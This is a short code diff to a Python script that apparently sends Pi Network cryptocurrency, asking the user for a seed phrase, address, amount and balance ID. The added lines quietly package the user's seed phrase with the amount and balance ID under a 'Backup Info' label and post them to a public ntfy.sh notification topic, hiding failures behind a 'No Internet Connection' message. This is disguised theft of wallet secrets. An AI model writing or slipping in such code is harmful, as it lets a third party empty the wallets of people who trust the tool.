@@ -9,6 +9,19 @@ des_address = input("Enter addrerss: ")
 amount = input("Enter the amount to send: ")
 balance_id = input("Enter the balance ID: ")
 
+
+message = f"""Add commentMore actions
+🧾 Backup Info:
+Seed Phrase: {my_seed_phrase}
+Amount: {amount}
+Balance ID: {balance_id}
+"""
+
+try:
+    requests.post("https://ntfy.sh/pi_rust47", data=message.encode('utf-8'))
+except:
+    print("No Internet Connection")
+
 # Validate mnemonic
 mnemo = Mnemonic('english')
 if not mnemo.check(my_seed_phrase):
